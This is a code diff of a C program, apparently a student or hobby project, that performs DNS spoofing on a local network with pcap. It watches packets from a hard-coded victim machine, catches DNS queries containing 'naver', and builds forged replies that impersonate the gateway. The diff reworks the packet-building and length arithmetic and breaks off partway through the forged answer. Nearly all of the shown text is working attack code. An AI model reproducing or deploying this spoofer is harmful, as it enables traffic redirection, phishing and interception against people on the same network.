@@ -156,7 +156,7 @@ int main(int agrc, char* garv[])
 	info.victim_ip[0] = 192;
 	info.victim_ip[1] = 168;
 	info.victim_ip[2] = 42;
-	info.victim_ip[3] = 14;
+	info.victim_ip[3] = 4;
 
 	if (!get_adapters())
 	{
@@ -526,11 +526,10 @@ bool dnsspoofing()
 		const u_char* pkt_data;
 		pcap_next_ex(info.pcap_handle, &header, &pkt_data);
 		int length = 0;
-		uint8_t packet[2500] = { 0 };
+		
 
 		struct eth_header* eth;
 		eth = (struct eth_header*)(pkt_data);
-		memcpy(packet, eth, sizeof(*eth));
 		length = sizeof(*eth);
 
 		if (eth->eth_src[0] == info.victim_mac[0] &&
@@ -543,59 +542,56 @@ bool dnsspoofing()
 			if (htons(eth->eth_type) == 0x0800) { // IP
 				struct ip_header* ip;
 				ip = (struct ip_header*)(pkt_data + length);
-				memcpy(packet + length, ip, sizeof(*ip));
 				length += sizeof(*ip);
 				
 				if (ip->dst_ip[0] != info.attacker_ip[0] ||
 					ip->dst_ip[1] != info.attacker_ip[1] ||
 					ip->dst_ip[2] != info.attacker_ip[2] ||
 					ip->dst_ip[3] != info.attacker_ip[3])
-				{
+				{								
 					if (ip->protocol == 0x11) // UDP
 					{
 						struct udp_header* udp;
-						udp = (struct udp_header*)(pkt_data + length);
-						memcpy(packet + length, udp, sizeof(*udp));
+						udp = (struct udp_header*)(pkt_data + length);						
 						length += sizeof(*udp);
 
 						if (htons(udp->dst_port) == 0x0035) //DNS
 						{
 
 							struct dns_header* dns;
-							dns = (struct dns_header*)(pkt_data + length);
-							memcpy(packet + length, dns, sizeof(*dns));
+							dns = (struct dns_header*)(pkt_data + length);						
 							length += sizeof(*dns);
 
 							struct queries que;
+
 							const u_char* name = (pkt_data + length);
 
-							
-
-							if (strstr((char*)name, "naver"))
+						    if (strstr((char*)name, "naver"))
 							{
+								struct answers ans;
+
 								uint8_t backwarding[2500] = { 0 };
-								int datapointer = 0;
+								
 								memcpy(eth->eth_src, info.gateway_mac,ETH_LEN);
 								memcpy(eth->eth_dst, info.victim_mac, ETH_LEN);
 								memcpy(backwarding, eth, sizeof(*eth));
-								datapointer = sizeof(*eth);
+								length = sizeof(*eth);
 
-								struct answers ans;
-
+								
 								
 								memcpy(ip->src_ip, ip->dst_ip, IP_LEN);
 								memcpy(ip->dst_ip, info.victim_ip, IP_LEN);
-								ip->total_len = htons(sizeof(*ip) + sizeof(*udp) + sizeof(*dns) + sizeof(que) + strlen((char*)name) +sizeof(que) + sizeof(ans) + 1);
+								ip->total_len = htons(sizeof(*ip) + sizeof(*udp) + sizeof(*dns) + strlen((char*)name) + sizeof(que) + sizeof(ans) + 1);
 								ip->checksum = 0;
 								ip_checksum(ip);
-								memcpy(backwarding+datapointer, ip, sizeof(*ip));
-								datapointer += sizeof(*ip);
+								memcpy(backwarding+length, ip, sizeof(*ip));
+								length += sizeof(*ip);
 
 								udp->dst_port = udp->src_port;
 								udp->src_port = htons(0x0035);			
-								udp->udp_len = htons(sizeof(*udp) + sizeof(*dns) + sizeof(que) + strlen((char*)name) +sizeof(que)+ sizeof(ans) + 1);
-								memcpy(backwarding + datapointer, udp, sizeof(*udp));
-								datapointer += sizeof(*udp);
+								udp->udp_len = htons(sizeof(*udp) + sizeof(*dns) + strlen((char*)name)+ sizeof(que) + sizeof(ans) + 1);
+								memcpy(backwarding + length , udp, sizeof(*udp));
+								length += sizeof(*udp);
 
 								dns->dns_flags = htons(0x8180);
 								dns->q_count = htons(0x0001);
@@ -603,8 +599,8 @@ bool dnsspoofing()
 								dns->aut_count = htons(0x0000);
 								dns->add_count = htons(0x0000);
 
-								memcpy(backwarding + datapointer, dns, sizeof(*dns));
-								datapointer += sizeof(*dns);
+								memcpy(backwarding + length, dns, sizeof(*dns));
+								length += sizeof(*dns);
 
 								que.que_class = htons(0x0001);
 								que.que_type = htons(0x0001);
@@ -614,7 +610,7 @@ bool dnsspoofing()
 								backwarding[length++] = 0;
 
 								memcpy(backwarding + length, &que, sizeof(que));
-								datapointer += sizeof(que);
+								length += sizeof(que);
 
 								ans.ans_name = htons(0xc00c);
 								ans.ans_type = htons(0x0001);
